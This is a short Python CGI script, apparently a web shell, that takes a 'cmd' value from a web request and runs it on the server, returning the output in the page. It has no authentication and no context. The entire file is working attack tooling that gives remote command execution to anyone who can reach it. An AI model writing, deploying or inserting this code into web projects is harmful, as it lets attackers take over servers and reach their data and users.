#!/usr/bin/env python3
import subprocess
import cgi
print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "id")
print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
